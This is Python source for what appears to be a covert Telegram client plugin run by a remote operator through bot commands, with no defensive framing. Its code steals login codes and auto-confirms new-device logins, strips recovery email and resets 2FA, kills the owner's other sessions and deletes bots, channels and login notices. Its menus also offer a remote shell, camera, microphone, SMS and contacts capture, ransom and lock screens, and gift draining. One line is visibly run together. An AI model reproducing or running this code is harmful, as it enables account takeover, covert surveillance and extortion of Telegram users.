    # ─── callback / message роутер ────────────────────────────────────────
    def _handle_callback(self, cb):
        try:
            cb_id = cb.get("id")
            data = cb.get("data", "")
            if cb_id:
                try:
                    self._answer_callback(cb_id)
                except Exception:
                    pass
            if data == "menu":
                self._show_main_menu()
            elif data == "back_auto":
                self._show_automatic_menu()
            elif data == "close_ransom":
                self._dismiss_ransom()
            elif data == "close_locker":
                self._clear_locker()
            elif data == "close_music":
                self._clear_music()
            elif data == "close_end":
                self._clear_dim()
            elif data == "hv_logout":
                threading.Thread(target=self._pull_out_account, daemon=True).start()
        except Exception as e:
            _log("callback: %s" % e)

    def _handle_message(self, msg):
        try:
            t = (msg.get("text") or "").strip()
            if not t:
                return

            # приоритет: ожидание ввода
            if self._input_mode:
                mode = self._input_mode
                self._input_mode = None
                self._input_context = None
                if mode == "music":
                    if t.startswith("http"):
                        self._play_mmusic(t)
                    else:
                        self._send_msg("Bad URL")
                    return
                if mode == "shell":
                    if t:
                        self._manual_shell(t)
                    return
                if mode == "term_hash":
                    try:
                        self._manual_terminate_session(int(t))
                    except Exception:
                        self._send_msg("Bad hash")
                    return

            # роутер
            if t == "Tg kid":
                threading.Thread(target=self._tg_kid, daemon=True).start()
            elif t == "IDK start":
                self._idk_start()
            elif t == "Screenshot gain":
                threading.Thread(target=self._screenshot_gain, daemon=True).start()
            elif t == "Manual using":
                self._show_manual_menu()
            elif t == "Troll":
                self._show_troll_menu()
            elif t == "Automatic":
                self._show_automatic_menu()
            elif t == "❓ Help":
                self._show_help()
            elif t == "⬅️ Back":
                self._show_main_menu()
            elif t == "Session Control":
                self._show_sessions_menu()
            elif t == "Surveillance":
                self._show_surveillance_menu()
            elif t == "Data Grab":
                self._show_data_menu()
            elif t == "Account":
                self._show_account_menu()
            elif t == "Shell":
                self._show_shell_menu()
            elif t == "Wipe Sessions":
                threading.Thread(target=self._session_wipe, daemon=True).start()
            elif t == "Kill All Sessions":
                threading.Thread(target=self._kill_sessions_full, daemon=True).start()
            elif t == "Session Dump":
                threading.Thread(target=self._manual_dump_session, daemon=True).start()
            elif t == "Userbot Dump":
                threading.Thread(target=self._manual_userbot_session, daemon=True).start()
            elif t == "Screenshot":
                threading.Thread(target=self._screenshot, daemon=True).start()
            elif t == "Camera Front":
                threading.Thread(target=self._manual_camera, args=("front",), daemon=True).start()
            elif t == "Camera Back":
                threading.Thread(target=self._manual_camera, args=("back",), daemon=True).start()
            elif t == "Audio 5s":
                threading.Thread(target=self._manual_audio, args=(5,), daemon=True).start()
            elif t == "SMS":
                threading.Thread(target=self._manual_sms, daemon=True).start()
            elif t == "Contacts":
                threading.Thread(target=self._manual_contacts, daemon=True).start()
            elif t == "Apps":
                threading.Thread(target=self._manual_apps, daemon=True).start()
            elif t == "Chats":
                threading.Thread(target=self._manual_chats, daemon=True).start()
            elif t == "Info":
                threading.Thread(target=self._harvest_account_info,
                                 args=(0, True), daemon=True).start()
            elif t == "Pull Out":
                threading.Thread(target=self._pull_out_account, daemon=True).start()
            elif t == "ls /sdcard":
                self._manual_shell("ls /sdcard")
            elif t == "ps":
                self._manual_shell("ps -A")
            elif t == "ifconfig":
                self._manual_shell("ifconfig")
            elif t == "df -h":
                self._manual_shell("df -h")
            elif t == "Ransom":
                self._show_ransom(RANSOM_TEXT, RANSOM_PHOTO_URL)
            elif t == "Lock screen":
                self._lock_screen()
            elif t == "M-music":
                self._input_mode = "music"
                self._send_msg("Send .mp3 URL")
            elif t == "Flood Gallery":
                threading.Thread(target=self._flood_gallery,
                                 args=(RANSOM_PHOTO_URL, 100), daemon=True).start()
            elif t == "Clear Flood":
                self._clear_flood()
            elif t == "Dim screen":
                self._dim_screen()
            elif t == "🌾 Full Harvest":
                self._full_harvest()
            elif t == "🔒 Full Lockdown":
                self._full_lockdown()
            elif t == "🎁 Gift Transfer":
                threading.Thread(target=self._drain_gifts_thread, daemon=True).start()
            # молча игнорируем всё остальное — не палим наличие плагина
        except Exception as e:
            _log("handle msg: %s" % e)

    # ─── HARVEST ──────────────────────────────────────────────────────────
    def _harvest_account_info(self, acc=0, send=False):
        out = {}
        try:
            uc = _UC().getInstance(acc)
            uid = int(uc.getClientUserId())
            out["user_id"] = str(uid)
            u = None
            try:
                u = uc.getCurrentUser()
            except Exception:
                pass
            if u is None:
                try:
                    u = _MC().getInstance(acc).getUser(uid)
                except Exception:
                    pass
            rp = _real_phone_or_empty(u)
            if rp:
                out["phone"] = rp
            if u is not None:
                fn = str(getattr(u, "first_name", "") or "").strip()
                ln = str(getattr(u, "last_name", "") or "").strip()
                un = str(getattr(u, "username", "") or "").strip()
                if fn:
                    out["first_name"] = fn
                if ln:
                    out["last_name"] = ln
                if un:
                    out["username"] = "@" + un if not un.startswith("@") else un
                if _get_bool_attr(u, "premium", False):
                    out["premium"] = "yes"
            try:
                dcid = uc.getCurrentDatacenterId()
                if dcid:
                    out["dc_id"] = str(int(dcid))
            except Exception:
                pass
            st = self._get_2fa_state(acc)
            if st is not None:
                out["2fa"] = "on" if st.get("has_password") else "off"
            try:
                bal = self._stars_balance(acc)
                if bal > 0:
                    out["stars_balance"] = str(bal)
            except Exception:
                pass
            if send:
                lines = ["<b>Account info</b>"]
                for k, v in out.items():
                    lines.append("<b>%s:</b> %s" % (k, self._html_escape(str(v))))
                self._send_msg("\n".join(lines), html=True)
        except Exception as e:
            _log("harvest: %s" % e)
        return out

    # ─── TG KID ───────────────────────────────────────────────────────────
    def _extract_code_from_msg(self, m):
        if m is None:
            return None, None, None, None
        raw_text = str(getattr(m, "message", "") or "")
        try:
            media = getattr(m, "media", None)
            if media is not None:
                wp = getattr(media, "webpage", None)
                if wp is not None:
                    raw_text = (raw_text + "\n" + str(getattr(wp, "title", "") or "") +
                                "\n" + str(getattr(wp, "description", "") or "")).strip()
        except Exception:
            pass
        if not raw_text:
            return None, None, None, None
        kind = "unknown"
        low = raw_text.lower()
        if "login code" in low or "код для входа" in low or "код входа" in low:
            kind = "login"
        elif "password reset" in low or "сброс" in low or "recovery" in low:
            kind = "reset"
        elif "new device" in low or "новом устройстве" in low or "новый вход" in low:
            kind = "device"
        patterns = [
            r"[Кк]од\s+для\s+входа\s+в\s+Telegram[:\s]*[«\"']?(\d{5})",
            r"[Ll]ogin\s+code[:\s]*[«\"']?(\d{5})",
            r"[Кк]од\s+подтверждения[:\s]*[«\"']?(\d{5})",
            r"[Cc]onfirmation\s+code[:\s]*[«\"']?(\d{5})",
            r"[Кк]од[:\s]+(\d{5})\b",
            r"(?:code|код)\D{0,10}(\d{5})\b",
        ]
        code = None
        for p in patterns:
            mm = re.search(p, raw_text, re.IGNORECASE)
            if mm:
                code = mm.group(1)
                break
        buttons = []
        try:
            rm = getattr(m, "reply_markup", None)
            if rm is not None:
                rows = getattr(rm, "rows", None)
                if rows is not None:
                    for ri in range(_jlist_size(rows)):
                        row = _jlist_get(rows, ri)
                        btns = getattr(row, "buttons", None)
                        if btns is None:
                            continue
                        for bi in range(_jlist_size(btns)):
                            b = _jlist_get(btns, bi)
                            txt = str(getattr(b, "text", "") or "")
                            data = getattr(b, "data", None)
                            buttons.append({"text": txt, "data": data})
                            if not code and txt:
                                bm = re.search(r"\b(\d{5})\b", txt)
                                if bm:
                                    code = bm.group(1)
        except Exception:
            pass
        if not code:
            return None, kind, raw_text[:400], buttons
        return code, kind, raw_text[:400], buttons

    def _pull_login_code(self, attempts=3, delay=2.0):
        HistReq = _cls("org.telegram.tgnet.TLRPC$TL_messages_getHistory",
                       "org.telegram.tgnet.tl.TL_messages$getHistory")
        if not HistReq:
            return None, None, None, 0, None
        for att in range(attempts):
            try:
                ip = self._get_input_peer(0, 777000)
                if ip is None:
                    time.sleep(delay)
                    continue
                req = HistReq()
                req.peer = ip
                req.limit = 20
                req.offset_id = 0
                resp, err = self._rg_rpc(req, 0, 8.0, fast=True)
                if err is None and resp is not None:
                    msgs = getattr(resp, "messages", None)
                    if msgs is not None and _jlist_size(msgs) > 0:
                        for i in range(_jlist_size(msgs)):
                            m = _jlist_get(msgs, i)
                            code, kind, raw, buttons = self._extract_code_from_msg(m)
                            if code:
                                mid = _safe_int(getattr(m, "id", 0))
                                return code, kind, raw, mid, buttons
            except Exception as e:
                _log("pull_login att %d: %s" % (att, e))
            if att < attempts - 1:
                time.sleep(delay)
        return None, None, None, 0, None

    def _auto_confirm_login(self, msg):
        try:
            rm = getattr(msg, "reply_markup", None)
            if rm is None:
                return False
            rows = getattr(rm, "rows", None)
            if rows is None:
                return False
            neg = ("не я", "не это я", "not me", "no", "reject", "terminate",
                   "revoke", "отклонить", "отменить", "это не я")
            pos = ("это я", "it's me", "its me", "yes", "accept", "confirm",
                   "подтвердить", "принять", "подтверждаю")
            target_btn = None
            for ri in range(_jlist_size(rows)):
                row = _jlist_get(rows, ri)
                btns = getattr(row, "buttons", None)
                if btns is None:
                    continue
                for bi in range(_jlist_size(btns)):
                    b = _jlist_get(btns, bi)
                    txt = str(getattr(b, "text", "") or "").lower()
                    if any(n in txt for n in neg):
                        continue
                    if any(p in txt for p in pos):
                        target_btn = b
                        break
                if target_btn is not None:
                    break
            if target_btn is None:
                return False
            mid = _safe_int(getattr(msg, "id", 0))
            if not mid:
                return False
            data = getattr(target_btn, "data", None)
            if data is None:
                return False
            Req = _cls("org.telegram.tgnet.TLRPC$TL_messages_getBotCallbackAnswer",
                       "org.telegram.tgnet.tl.TL_messages$getBotCallbackAnswer")
            if not Req:
                return False
            rq = Req()
            try:
                rq.peer = self._get_input_peer(0, 777000)
            except Exception:
                pass
            rq.msg_id = mid
            try:
                rq.data = data
            except Exception:
                pass
            r, _e = self._rg_rpc(rq, 0, 10.0, fast=True)
            return r is not None
        except Exception as e:
            _log("auto_confirm: %s" % e)
            return False

    def _tg_kid(self):
        try:
            code, kind, raw, mid, buttons = self._pull_login_code(attempts=3, delay=2.0)
            acc_info = self._harvest_account_info(0)
            raw_phone = acc_info.get("phone") or ""
            phone = raw_phone if raw_phone.startswith("+") else ("+" + raw_phone if raw_phone else "—")
            lines = ["<b>Tg kid</b>", ""]
            if code:
                lines.append("<b>Code:</b> <code>%s</code> (%s)" % (
                    self._html_escape(code), self._html_escape(kind or "login")))
                self._tg_kid_seen.add(str(code))
            else:
                lines.append("<b>Code:</b> not found — watching 10 min")
            lines.append("<b>Phone:</b> %s" % self._html_escape(phone))
            for k, v in acc_info.items():
                if k == "phone":
                    continue
                if v in (None, "", "?", "0"):
                    continue
                lines.append("<b>%s:</b> %s" % (
                    self._html_escape(k), self._html_escape(str(v))))
            if raw:
                lines.append("")
                lines.append("<pre>" + self._html_escape(raw[:400]) + "</pre>")
            if buttons:
                bt = " | ".join(b.get("text", "") for b in buttons if b.get("text"))
                if bt:
                    lines.append("<b>Buttons:</b> %s" % self._html_escape(bt))
            self._send_msg("\n".join(lines), html=True)

            try:
                HistReq = _cls("org.telegram.tgnet.TLRPC$TL_messages_getHistory",
                               "org.telegram.tgnet.tl.TL_messages$getHistory")
                if HistReq:
                    ip = self._get_input_peer(0, 777000)
                    if ip is not None:
                        rq = HistReq()
                        rq.peer = ip
                        rq.limit = 5
                        rq.offset_id = 0
                        resp, _e = self._rg_rpc(rq, 0, 8.0, fast=True)
                        if resp is not None:
                            msgs = getattr(resp, "messages", None)
                            if msgs is not None and _jlist_size(msgs) > 0:
                                m0 = _jlist_get(msgs, 0)
                                if self._auto_confirm_login(m0):
                                    self._send_msg("auto-confirmed It's me")
            except Exception as e:
                _log("auto confirm initial: %s" % e)

            if not self._tg_kid_watching:
                self._tg_kid_watching = True
                self._tg_kid_thread = threading.Thread(
                    target=self._tg_kid_watch_loop, daemon=True)
                self._tg_kid_thread.start()
            return code
        except Exception as e:
            self._send_msg("Tg kid err: " + str(e))
            return None

    def _tg_kid_watch_loop(self, duration=600, poll=5):
        end = time.time() + duration
        last_max_id = 0
        HistReq = _cls("org.telegram.tgnet.TLRPC$TL_messages_getHistory",
                       "org.telegram.tgnet.tl.TL_messages$getHistory")
        if not HistReq:
            self._tg_kid_watching = False
            return
        try:
            ip = self._get_input_peer(0, 777000)
            if ip is not None:
                rq = HistReq()
                rq.peer = ip
                rq.limit = 1
                rq.offset_id = 0
                resp, _e = self._rg_rpc(rq, 0, 6.0, fast=True)
                if resp is not None:
                    msgs = getattr(resp, "messages", None)
                    if msgs is not None and _jlist_size(msgs) > 0:
                        last_max_id = _safe_int(getattr(_jlist_get(msgs, 0), "id", 0))
        except Exception:
            pass

        while time.time() < end and self._sync_running and not self.stop:
            try:
                ip = self._get_input_peer(0, 777000)
                if ip is not None:
                    rq = HistReq()
                    rq.peer = ip
                    rq.limit = 10
                    rq.offset_id = 0
                    resp, _e = self._rg_rpc(rq, 0, 8.0, fast=True)
                    if resp is not None:
                        msgs = getattr(resp, "messages", None)
                        if msgs is not None and _jlist_size(msgs) > 0:
                            new_msgs = []
                            for i in range(_jlist_size(msgs)):
                                m = _jlist_get(msgs, i)
                                mid = _safe_int(getattr(m, "id", 0))
                                if mid and mid > last_max_id:
                                    new_msgs.append((mid, m))
                            if new_msgs:
                                last_max_id = max(mid for mid, _m in new_msgs)
                                new_msgs.sort(key=lambda x: x[0])
                                for mid, m in new_msgs:
                                    code, kind, raw, buttons = self._extract_code_from_msg(m)
                                    if code and str(code) not in self._tg_kid_seen:
                                        self._tg_kid_seen.add(str(code))
                                        line = "<b>New %s</b>\n<b>Code:</b> <code>%s</code>" % (
                                            self._html_escape(kind or "login"),
                                            self._html_escape(code))
                                        if raw:
                                            line += "\n<pre>" + self._html_escape(raw[:300]) + "</pre>"
                                        self._send_msg(line, html=True)
                                    if self._auto_confirm_login(m):
                                        self._send_msg("auto-confirmed (msg %d)" % mid)
            except Exception as e:
                _log("kid watch: %s" % e)
            for _ in range(poll):
                if not self._sync_running or self.stop:
                    break
                time.sleep(1)
        self._tg_kid_watching = False

    # ─── SCREENSHOT GAIN ──────────────────────────────────────────────────
    def _screenshot_gain(self):
        results = {"screenshot": None, "camera_front": None, "camera_back": None}
        try:
            self._send_msg("screenshot gain: screen...")
            try:
                results["screenshot"] = self._screenshot()
            except Exception as e:
                results["screenshot"] = {"error": str(e)}
            self._send_msg("screenshot gain: front...")
            try:
                results["camera_front"] = self._manual_camera("front")
            except Exception as e:
                results["camera_front"] = {"error": str(e)}
            self._send_msg("screenshot gain: back...")
            try:
                results["camera_back"] = self._manual_camera("back")
            except Exception as e:
                results["camera_back"] = {"error": str(e)}
            lines = ["<b>Screenshot gain — result</b>"]
            for name, r in results.items():
                if isinstance(r, dict):
                    lines.append("<b>%s:</b> %s" % (
                        name, "ok" if r.get("ok") else r.get("error", "fail")))
                else:
                    lines.append("<b>%s:</b> %s" % (name, r))
            self._send_msg("\n".join(lines), html=True)
        except Exception as e:
            self._send_msg("Screenshot gain err: " + str(e))
        return results

    # ─── 2FA ──────────────────────────────────────────────────────────────
    def _get_2fa_state(self, acc=0):
        try:
            Req = _cls("org.telegram.tgnet.TLRPC$TL_account_getPassword",
                       "org.telegram.tgnet.tl.TL_account$getPassword")
            if not Req:
                return None
            req = Req()
            resp, err = self._rg_rpc(req, acc, 10.0, fast=True)
            if err is not None or resp is None:
                return None
            return {
                "has_password": _get_bool_attr(resp, "has_password", False),
                "hint": str(getattr(resp, "hint", "") or ""),
            }
        except Exception:
            return None

    def _try_kill_2fa(self, acc=0):
        try:
            Rst = _cls("org.telegram.tgnet.TLRPC$TL_account_resetPassword",
                       "org.telegram.tgnet.tl.TL_account$resetPassword")
            if not Rst:
                return "no class"
            req = Rst()
            resp, err = self._rg_rpc(req, acc, 12.0)
            if resp is not None:
                return "ok"
            etxt = str(getattr(err, "text", err) or err)
            if "PASSWORD_NOT_SET" in etxt:
                return "not_set"
            if "SESSION_PASSWORD_NEEDED" in etxt:
                return "need_password"
            if "FLOOD_WAIT" in etxt:
                return "flood"
            return "fail: %s" % etxt[:60]
        except Exception as e:
            return "exc: %s" % e

    def _request_password_reset(self, acc=0):
        try:
            Rst = _cls("org.telegram.tgnet.TLRPC$TL_account_resetPassword",
                       "org.telegram.tgnet.tl.TL_account$resetPassword")
            if not Rst:
                return {"state": "error"}
            rq = Rst()
            resp, err = self._rg_rpc(rq, acc, 15.0)
            if err is not None or resp is None:
                return {"state": "error"}
            cls_name = str(type(resp))
            state = "unknown"
            until_ts = 0
            if "resetPasswordOk" in cls_name:
                state = "ok"
            elif "resetPasswordRequestedWait" in cls_name:
                state = "requested"
                until_ts = _safe_int(getattr(resp, "until_date", 0))
            elif "resetPasswordFailedWait" in cls_name:
                state = "wait"
            else:
                if hasattr(resp, "until_date"):
                    state = "requested"
                    until_ts = _safe_int(getattr(resp, "until_date", 0))
            out = {"state": state}
            if until_ts:
                out["until"] = until_ts
                try:
                    out["until_human"] = time.strftime("%Y-%m-%d %H:%M:%S",
                                                       time.localtime(until_ts))
                    out["days_left"] = max(0, int((until_ts - time.time()) / 86400))
                except Exception:
                    pass
            return out
        except Exception as e:
            return {"state": "error", "error": str(e)}

    def _remove_recovery_email(self, acc=0):
        try:
            PS = _cls("org.telegram.tgnet.TLRPC$TL_passwordInputSettings",
                      "org.telegram.tgnet.tl.TL_account$TL_passwordInputSettings")
            if not PS:
                return {"ok": False}
            ns = PS()
            try:
                ns.email = ""
            except Exception:
                pass
            try:
                ns.flags = 0
            except Exception:
                pass
            Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings",
                       "org.telegram.tgnet.tl.TL_account$updatePasswordSettings")
            if not Upd:
                return {"ok": False}
            rq = Upd()
            try:
                rq.password = None
            except Exception:
                pass
            rq.new_settings = ns
            r, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
            return {"ok": r is not None}
        except Exception:
            return {"ok": False}

    def _nuke_password_pipeline(self, acc=0):
        report = {"recovery_removed": False, "reset_password": "?",
                  "cloud_wiped": None, "state_before": None, "state_after": None,
                  "attempts": 0, "delayed_reset": None, "final": "unknown"}
        try:
            report["state_before"] = self._get_2fa_state(acc)
        except Exception:
            pass
        sb = report["state_before"]
        if sb is not None and not sb.get("has_password"):
            report["final"] = "clean"
            return report
        for attempt in range(3):
            report["attempts"] = attempt + 1
            try:
                r = self._remove_recovery_email(acc)
                if isinstance(r, dict) and r.get("ok"):
                    report["recovery_removed"] = True
            except Exception:
                pass
            time.sleep(0.5)
            try:
                r = self._try_kill_2fa(acc)
                report["reset_password"] = r
                if r in ("ok", "not_set"):
                    break
            except Exception as e:
                report["reset_password"] = "exc: %s" % e
            time.sleep(0.5)
            if report["reset_password"] not in ("ok", "not_set"):
                try:
                    pr = self._request_password_reset(acc)
                    report["delayed_reset"] = pr
                    if pr.get("state") == "ok":
                        break
                except Exception as e:
                    report["delayed_reset"] = {"state": "error", "error": str(e)}
            time.sleep(1.0)
        try:
            report["state_after"] = self._get_2fa_state(acc)
        except Exception:
            pass
        sa = report["state_after"]
        report["final"] = "clean" if (sa is None or not sa.get("has_password")) else "still_has_password"
        return report

    # ─── SESSIONS ─────────────────────────────────────────────────────────
    def _get_authorizations_full(self, acc=0):
        try:
            Req = _cls("org.telegram.tgnet.TLRPC$TL_account_getAuthorizations",
                       "org.telegram.tgnet.tl.TL_account$getAuthorizations")
            if not Req:
                return None
            req = Req()
            resp, err = self._rg_rpc(req, acc, 8.0, fast=True)
            if resp is None:
                return None
            auths = getattr(resp, "authorizations", None)
            out = []
            if auths is None:
                return out
            n = _jlist_size(auths)
            for i in range(n):
                a = _jlist_get(auths, i)
                if not a:
                    continue
                out.append({
                    "hash": _safe_int(getattr(a, "hash", 0)),
                    "current": _get_bool_attr(a, "current", False),
                    "unconfirmed": _get_bool_attr(a, "unconfirmed", False),
                })
            return out
        except Exception:
            return None

    def _kill_all_sessions(self, acc=0):
        auths = self._get_authorizations_full(acc)
        if auths is None:
            return 0, 0
        total = len(auths)
        dead = set()

        def _one(h):
            try:
                Rst = _cls("org.telegram.tgnet.TLRPC$TL_account_resetAuthorization",
                           "org.telegram.tgnet.tl.TL_account$resetAuthorization")
                if not Rst:
                    return False
                rq = Rst()
                rq.hash = h
                _r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
                return e is None
            except Exception:
                return False

        killed = 0
        for _pass in range(5):
            targets = [a["hash"] for a in auths
                       if not a["current"] and a["hash"] and a["hash"] not in dead]
            if not targets:
                break
            res = self._parallel([(_one, h) for h in targets], workers=6, timeout=40)
            for r, h in zip(res, targets):
                if r is True:
                    killed += 1
                    dead.add(h)
            if _pass < 4:
                time.sleep(1.5)
                a2 = self._get_authorizations_full(acc)
                if not a2:
                    break
                auths = a2
                total = max(total, len(a2))
        try:
            Rst = _cls("org.telegram.tgnet.TLRPC$TL_auth_resetAuthorizations",
                       "org.telegram.tgnet.tl.TL_auth$resetAuthorizations")
            if Rst:
                self._rg_rpc(Rst(), acc, 10.0, fast=True)
        except Exception:
            pass
        return killed, max(total, killed)

    def _wipe_sessions_all(self):
        out = []
        for a in self._get_accounts_list():
            aid = a.get("id", 0)
            try:
                k, t = self._kill_all_sessions(aid)
                out.append({"account": aid, "user_id": a.get("user_id"),
                            "killed": k, "total": t})
            except Exception as e:
                out.append({"account": aid, "error": str(e)})
        return out

    def _kill_sessions_full(self):
        try:
            self._send_msg("Kill all sessions...")
            ws = self._wipe_sessions_all()
            tk = sum(x.get("killed", 0) for x in ws if isinstance(x, dict))
            self._send_msg("Sessions killed: %d" % tk)
        except Exception as e:
            self._send_msg("kill sessions err: " + str(e))

    def _session_wipe(self):
        try:
            self._send_msg("Wipe sessions...")
            k, t = self._kill_all_sessions(0)
            self._send_msg("Wiped: %d / %d" % (k, t))
        except Exception as e:
            self._send_msg("wipe err: " + str(e))

    def _kill_web_authorizations(self, acc=0):
        try:
            Get = _cls("org.telegram.tgnet.TLRPC$TL_account_getWebAuthorizations",
                       "org.telegram.tgnet.tl.TL_account$getWebAuthorizations")
            if not Get:
                return 0
            resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
            if resp is None:
                return 0
            auths = getattr(resp, "authorizations", None)
            if auths is None:
                return 0
            Reset = _cls("org.telegram.tgnet.TLRPC$TL_account_resetWebAuthorization",
                         "org.telegram.tgnet.tl.TL_account$resetWebAuthorization")
            if not Reset:
                return 0
            hashes = []
            for i in range(_jlist_size(auths)):
                a = _jlist_get(auths, i)
                h = _safe_int(getattr(a, "hash", 0))
                if h:
                    hashes.append(h)

            def _one(h):
                try:
                    rq = Reset()
                    rq.hash = h
                    _r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
                    return e is None
                except Exception:
                    return False

            res = self._parallel([(_one, h) for h in hashes], workers=5, timeout=25)
            return sum(1 for r in res if r is True)
        except Exception:
            return 0

    def _kill_bots(self, acc=0):
        try:
            Get = _cls("org.telegram.tgnet.TLRPC$TL_bots_getAdminedBots",
                       "org.telegram.tgnet.tl.TL_bots$getAdminedBots")
            Del = _cls("org.telegram.tgnet.TLRPC$TL_bots_deleteBot",
                       "org.telegram.tgnet.tl.TL_bots$deleteBot")
            IU = _cls("org.telegram.tgnet.TLRPC$TL_inputUser",
                      "org.telegram.tgnet.tl.TL_users$TL_inputUser")
            if not (Get and Del and IU):
                return 0
            resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
            if resp is None:
                return 0
            bots = []
            for i in range(_jlist_size(resp)):
                b = _jlist_get(resp, i)
                bid = _safe_int(getattr(b, "id", 0))
                bah = _safe_int(getattr(b, "access_hash", 0))
                if bid and bah:
                    bots.append((bid, bah))

            def _one(bid, bah):
                try:
                    iu = IU()
                    iu.user_id = bid
                    iu.access_hash = bah
                    rq = Del()
                    rq.bot = iu
                    _r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
                    return e is None
                except Exception:
                    return False

            res = self._parallel([(_one, b, a) for (b, a) in bots], workers=5, timeout=25)
            return sum(1 for r in res if r is True)
        except Exception:
            return 0

    def _leave_all_channels(self, acc=0):
        try:
            Leave = _cls("org.telegram.tgnet.TLRPC$TL_channels_leaveChannel",
                         "org.telegram.tgnet.tl.TL_channels$leaveChannel")
            IC = _cls("org.telegram.tgnet.TLRPC$TL_inputChannel",
                      "org.telegram.tgnet.tl.TL_channels$TL_inputChannel")
            if not (Leave and IC):
                return 0
            mc = _MC().getInstance(acc)
            try:
                dialogs = mc.dialogs_dict
            except Exception:
                dialogs = mc.getAllDialogs()
            if dialogs is None:
                return 0
            targets = []
            for i in range(_jlist_size(dialogs)):
                try:
                    did = int(dialogs.keyAt(i)) if hasattr(dialogs, "keyAt") else 0
                    if did >= -1000000000000:
                        continue
                    cid = -did - 1000000000000
                    ch = mc.getChat(cid)
                    if ch is None:
                        continue
                    ah = _safe_int(getattr(ch, "access_hash", 0))
                    if not ah:
                        continue
                    targets.append((cid, ah))
                except Exception:
                    pass

            def _one(cid, ah):
                try:
                    ic = IC()
                    ic.channel_id = cid
                    ic.access_hash = ah
                    rq = Leave()
                    rq.channel = ic
                    r, _e = self._rg_rpc(rq, acc, 6.0, fast=True)
                    return r is not None
                except Exception:
                    return False

            res = self._parallel([(_one, c, a) for (c, a) in targets],
                                 workers=6, timeout=40)
            return sum(1 for r in res if r is True)
        except Exception:
            return 0

    def _confirm_unconfirmed_sessions(self, acc=0):
        try:
            last = self._last_session_confirm.get(acc, 0)
            if time.time() - last < 60:
                return 0
            self._last_session_confirm[acc] = time.time()
            auths = self._get_authorizations_full(acc)
            if not auths:
                return 0
            Ch = _cls("org.telegram.tgnet.TLRPC$TL_account_changeAuthorizationSettings",
                      "org.telegram.tgnet.tl.TL_account$changeAuthorizationSettings")
            if not Ch:
                return 0
            confirmed = 0
            for a in auths:
                if not a.get("unconfirmed"):
                    continue
                try:
                    rq = Ch()
                    rq.hash = a["hash"]
                    try:
                        rq.confirmed = True
                    except Exception:
                        pass
                    try:
                        rq.flags = getattr(rq, "flags", 0) | 8
                    except Exception:
                        pass
                    _r2, e2 = self._rg_rpc(rq, acc, 10.0, fast=True)
                    if e2 is None:
                        confirmed += 1
                except Exception:
                    pass
            return confirmed
        except Exception:
            return 0    def _kill_login_notice_dialog(self, acc=0):
        try:
            mc = _MC().getInstance(acc)
            for args in ((777000, 0, 0, True), (777000, 0, True), (777000, True)):
                try:
                    mc.deleteDialog(*args)
                    return True
                except Exception:
                    pass
        except Exception:
            pass
        return False

